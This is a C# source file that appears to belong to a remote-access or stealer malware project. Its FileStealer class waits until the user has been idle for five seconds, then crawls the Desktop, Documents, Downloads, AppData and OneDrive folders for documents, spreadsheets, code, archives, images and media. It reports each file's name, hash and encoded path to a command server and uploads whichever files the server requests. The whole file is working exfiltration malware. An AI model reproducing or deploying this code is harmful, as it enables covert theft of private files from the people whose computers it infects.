using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using True.Core;

namespace True.Features
{
    public static class FileStealer
    {
        private static readonly string[] TargetDirs = new[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive")
        };

        private static readonly string[] TargetExtensions = {
            ".docx", ".doc", ".pdf", ".txt", ".rtf", ".odt", ".tex", ".md",
            ".xlsx", ".xls", ".csv", ".ods",
            ".pptx", ".ppt", ".odp",
            ".json", ".xml", ".yaml", ".yml", ".log",
            ".py", ".js", ".java", ".cs", ".html", ".css", ".ipynb",
            ".zip", ".rar", ".7z", ".tar", ".gz",
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg",
            ".mp3", ".wav", ".flac", ".aac",
            ".mp4", ".avi", ".mov", ".mkv"
        };

        private static readonly HashSet<string> Visited = new();
        private static readonly SemaphoreSlim Throttle = new(3);
        private const int MaxDepth = 5;
        private const long MaxSizeBytes = 20 * 1024 * 1024; // 20MB
        private const int MaxUploadsPerRun = 100;

        [DllImport("user32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [StructLayout(LayoutKind.Sequential)]
        private struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }

        private static bool IsSystemIdle()
        {
            var info = new LASTINPUTINFO();
            info.cbSize = (uint)Marshal.SizeOf(info);
            GetLastInputInfo(ref info);
            uint idleTime = ((uint)Environment.TickCount - info.dwTime);
            return idleTime > 5 * 1000; // 5 seconds
        }

        public static async Task StartStealingAsync(bool force = false)
        {
            Logger.Info("Stealer", "StartStealingAsync() called.");

            if (!force && !IsSystemIdle())
            {
                Logger.Warn("Stealer", "System not idle. Skipping file stealing.");
                return;
            }

            Logger.Info("Stealer", "System is idle. Beginning crawl...");

            int uploadedCount = 0;
            List<Task> tasks = new();

            foreach (var dir in TargetDirs)
            {
                tasks.Add(CrawlDirectoryAsync(dir, 0, async () =>
                {
                    if (Interlocked.Increment(ref uploadedCount) > MaxUploadsPerRun)
                        return false;
                    return true;
                }));
            }

            await Task.WhenAll(tasks);
            await Communicator.PostResponse("stealer", $"Uploaded {uploadedCount} new files.");
        }

        private static async Task CrawlDirectoryAsync(string dir, int depth, Func<Task<bool>> allowUpload)
        {
            if (depth > MaxDepth || Visited.Contains(dir) ||
                dir.StartsWith("C:\\Windows") ||
                dir.Contains("\\Temp") ||
                dir.Contains("Program Files") ||
                dir.Contains("AppData\\Local\\Packages"))
                return;

            Visited.Add(dir);

            try
            {
                var files = Directory.GetFiles(dir);
                List<Task> uploadTasks = new();

                foreach (var file in files)
                {
                    FileInfo fi = new(file);
                    if (fi.Length > MaxSizeBytes || !TargetExtensions.Contains(fi.Extension.ToLower()))
                        continue;

                    await Throttle.WaitAsync();
                    uploadTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            string hash = await ComputeHashAsync(file);
                            string filename = fi.Name;
                            string encodedPath = Convert.ToBase64String(Encoding.UTF8.GetBytes(file));
                            string lastModified = fi.LastWriteTimeUtc.ToString("o");

                            string payload = $"filename={filename}&hash={hash}&lastModified={lastModified}&path={encodedPath}";
                            var result = await Communicator.PostCheckSteal(payload);

                            if (result == "upload" && await allowUpload())
                            {
                                byte[] content = await File.ReadAllBytesAsync(file);

                                bool uploaded = false;
                                for (int i = 0; i < 2 && !uploaded; i++)
                                {
                                    try
                                    {
                                        await Communicator.PostStolenFile(content, filename);
                                        Logger.Info("Stealer", $"Uploaded {filename}");
                                        uploaded = true;
                                    }
                                    catch
                                    {
                                        await Task.Delay(1000);
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Warn("Stealer", $"Error uploading {file}: {ex.Message}");
                        }
                        finally
                        {
                            Throttle.Release();
                        }
                    }));
                }

                await Task.WhenAll(uploadTasks);

                foreach (var subdir in Directory.GetDirectories(dir))
                {
                    await CrawlDirectoryAsync(subdir, depth + 1, allowUpload);
                }
            }
            catch (Exception ex)
            {
                Logger.Warn("Stealer", $"Access denied or error in dir {dir}: {ex.Message}");
            }
        }

        private static async Task<string> ComputeHashAsync(string filePath)
        {
            try
            {
                using var sha256 = SHA256.Create();
                using var stream = File.OpenRead(filePath);
                byte[] hash = await sha256.ComputeHashAsync(stream);
                return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
            }
            catch
            {
                return string.Empty;
            }
        }
    }
}
